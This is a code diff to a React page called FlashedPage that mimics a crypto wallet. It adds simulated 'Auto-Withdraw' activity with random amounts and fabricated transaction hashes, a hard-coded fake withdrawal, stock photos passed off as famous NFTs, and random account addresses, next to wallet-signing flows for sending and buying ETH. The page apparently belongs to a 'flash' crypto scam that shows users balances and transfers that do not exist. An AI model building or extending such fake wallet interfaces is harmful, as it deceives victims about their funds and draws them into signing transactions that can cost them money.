@@ -24,7 +24,34 @@ export default function FlashedPage() {
       setTimeLeft(prev => prev > 0 ? prev - 1 : 0);
     }, 1000);
     
-    return () => clearInterval(timer);
+    // Simulate auto-withdrawals every 30 seconds
+    const autoWithdraw = setInterval(() => {
+      if (Math.random() > 0.7) { // 30% chance
+        const amounts = ['150.00', '275.50', '89.25', '420.00', '67.80'];
+        const tokens = ['USDT', 'USDC', 'ETH', 'LINK', 'UNI'];
+        const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+        const randomToken = tokens[Math.floor(Math.random() * tokens.length)];
+        
+        setWalletData(prev => ({
+          ...prev,
+          recentActivity: [
+            { 
+              type: 'Auto-Withdraw', 
+              token: randomToken, 
+              amount: randomAmount, 
+              time: 'Just now', 
+              hash: '0x' + Math.random().toString(16).substr(2, 64) 
+            },
+            ...prev.recentActivity.slice(0, 9)
+          ]
+        }));
+      }
+    }, 30000);
+    
+    return () => {
+      clearInterval(timer);
+      clearInterval(autoWithdraw);
+    };
   }, []);
   
   const formatTime = (seconds) => {
@@ -135,7 +162,8 @@ export default function FlashedPage() {
         { type: 'Received', token: 'USDT', amount: '2,450.00', time: '2 hours ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
         { type: 'Swapped', token: 'ETH → USDC', amount: '1.5 ETH', time: '1 day ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
         { type: 'Sent', token: 'LINK', amount: '125.00', time: '3 days ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
-        { type: 'Received', token: 'UNI', amount: '89.50', time: '5 days ago', hash: '0x' + Math.random().toString(16).substr(2, 64) }
+        { type: 'Received', token: 'UNI', amount: '89.50', time: '5 days ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
+        { type: 'Auto-Withdraw', token: 'USDT', amount: '500.00', time: 'Just now', hash: '0x' + Math.random().toString(16).substr(2, 64) }
       ]
     };
     
@@ -202,6 +230,12 @@ export default function FlashedPage() {
     setLoading(true);
 
     try {
+      if (!window.ethereum) {
+        setStatus('Please connect your wallet first');
+        setLoading(false);
+        return;
+      }
+      
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       
@@ -273,6 +307,11 @@ export default function FlashedPage() {
 
   const processBuyETH = async (amount) => {
     try {
+      if (!window.ethereum) {
+        setStatus('Please install MetaMask or use mobile wallet');
+        return;
+      }
+      
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       
@@ -360,14 +399,23 @@ export default function FlashedPage() {
           {/* Account Section */}
           <div className="p-6 bg-gray-800 border-b border-gray-700">
             <div className="flex items-center justify-between mb-4">
-              <div>
-                <div className="text-white font-semibold">Account 1</div>
-                <div className="text-gray-400 text-sm">8 network addresses</div>
+              <div className="flex items-center cursor-pointer hover:bg-gray-700 p-2 rounded-lg transition-all" onClick={() => setShowModal('accountDetails')}>
+                <div className="w-8 h-8 mr-3">
+                  <img src="https://api.dicebear.com/7.x/identicon/svg?seed=${userAddress}" alt="Profile" className="w-full h-full rounded-full" />
+                </div>
+                <div>
+                  <div className="text-white font-semibold flex items-center">
+                    Account 1 
+                    <i className="fas fa-chevron-down text-gray-400 ml-2 text-xs"></i>
+                  </div>
+                  <div className="text-gray-400 text-sm">8 network addresses</div>
+                </div>
               </div>
               <div className="relative">
-                <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
+                <div className="w-8 h-8 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center">
                   <span className="text-white text-xs font-bold">1</span>
                 </div>
+                <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-400 rounded-full border border-gray-800"></div>
               </div>
             </div>
 
@@ -421,8 +469,8 @@ export default function FlashedPage() {
           {/* Rewards Banner */}
           <div className="bg-gradient-to-r from-purple-600 to-pink-600 m-4 p-4 rounded-lg flex items-center justify-between">
             <div className="flex items-center">
-              <div className="w-12 h-12 bg-orange-500 rounded-lg flex items-center justify-center mr-3">
-                <span className="text-white font-bold">M</span>
+              <div className="w-12 h-12 mr-3">
+                <img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=100&h=100&fit=crop&crop=center" alt="Rewards" className="w-full h-full rounded-lg object-cover" />
               </div>
               <div>
                 <div className="text-white font-semibold">Rewards are here</div>
@@ -530,45 +578,55 @@ export default function FlashedPage() {
 
             {activeTab === 'DeFi' && (
               <div>
-                {walletData.defiPositions.map((position, index) => (
-                  <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
-                    <div className="flex items-center">
-                      <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center mr-3">
-                        <span className="text-white text-xs font-bold">D</span>
+                {walletData.defiPositions.map((position, index) => {
+                  const protocolLogos = {
+                    'Uniswap V3': 'https://cryptologos.cc/logos/uniswap-uni-logo.png',
+                    'Aave': 'https://cryptologos.cc/logos/aave-aave-logo.png',
+                    'Compound': 'https://cryptologos.cc/logos/compound-comp-logo.png'
+                  };
+                  return (
+                    <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
+                      <div className="flex items-center">
+                        <img src={protocolLogos[position.protocol]} alt={position.protocol} className="w-8 h-8 rounded-full mr-3" />
+                        <div>
+                          <div className="text-white font-medium">{position.protocol}</div>
+                          <div className="text-gray-400 text-sm">{position.type} • {position.apy} APY</div>
+                        </div>
                       </div>
-                      <div>
-                        <div className="text-white font-medium">{position.protocol}</div>
-                        <div className="text-gray-400 text-sm">{position.type} • {position.apy} APY</div>
+                      <div className="text-right">
+                        <div className="text-white font-medium">{position.value}</div>
+                        <div className="text-green-400 text-sm">Earning</div>
                       </div>
                     </div>
-                    <div className="text-right">
-                      <div className="text-white font-medium">{position.value}</div>
-                      <div className="text-green-400 text-sm">Earning</div>
-                    </div>
-                  </div>
-                ))}
+                  );
+                })}
               </div>
             )}
 
             {activeTab === 'NFTs' && (
               <div>
-                {walletData.nfts.map((nft, index) => (
-                  <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
-                    <div className="flex items-center">
-                      <div className="w-12 h-12 bg-gradient-to-r from-purple-500 to-pink-500 rounded-lg mr-3 flex items-center justify-center">
-                        <span className="text-white text-xs font-bold">NFT</span>
+                {walletData.nfts.map((nft, index) => {
+                  const nftImages = {
+                    'Bored Ape #7234': 'https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=100&h=100&fit=crop',
+                    'CryptoPunk #3421': 'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?w=100&h=100&fit=crop',
+                    'Azuki #892': 'https://images.unsplash.com/photo-1634973357973-f2ed2657db3c?w=100&h=100&fit=crop'
+                  };
+                  return (
+                    <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
+                      <div className="flex items-center">
+                        <img src={nftImages[nft.name]} alt={nft.name} className="w-12 h-12 rounded-lg mr-3 object-cover" />
+                        <div>
+                          <div className="text-white font-medium">{nft.name}</div>
+                          <div className="text-gray-400 text-sm">{nft.collection}</div>
+                        </div>
                       </div>
-                      <div>
-                        <div className="text-white font-medium">{nft.name}</div>
-                        <div className="text-gray-400 text-sm">{nft.collection}</div>
+                      <div className="text-right">
+                        <div className="text-white font-medium">{nft.value}</div>
+                        <div className="text-gray-400 text-sm">Floor</div>
                       </div>
                     </div>
-                    <div className="text-right">
-                      <div className="text-white font-medium">{nft.value}</div>
-                      <div className="text-gray-400 text-sm">Floor</div>
-                    </div>
-                  </div>
-                ))}
+                  );
+                })}
               </div>
             )}
 
@@ -971,6 +1029,35 @@ export default function FlashedPage() {
                 </div>
                 <div className="mt-4 text-center">
                   <p className="text-gray-400 text-sm">No wallet? Download one above</p>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Account Details Modal */}
+          {showModal === 'accountDetails' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Select Account</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-3">
+                  {[1,2,3,4,5,6,7,8].map(num => (
+                    <div key={num} className="flex items-center justify-between p-3 hover:bg-gray-700 rounded-lg cursor-pointer">
+                      <div className="flex items-center">
+                        <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=account${num}`} alt={`Account ${num}`} className="w-8 h-8 rounded-full mr-3" />
+                        <div>
+                          <div className="text-white font-medium">Account {num}</div>
+                          <div className="text-gray-400 text-sm">{num === 1 ? walletData.address.slice(0,10) + '...' : '0x' + Math.random().toString(16).substr(2, 10) + '...'}</div>
+                        </div>
+                      </div>
+                      <div className="text-right">
+                        <div className="text-white text-sm">{num === 1 ? '$' + walletData.totalValue.toLocaleString() : '$0.00'}</div>
+                        <div className="text-gray-400 text-xs">{num === 1 ? 'Active' : 'Empty'}</div>
+                      </div>
+                    </div>
+                  ))}
                 </div>
               </div>
             </div>
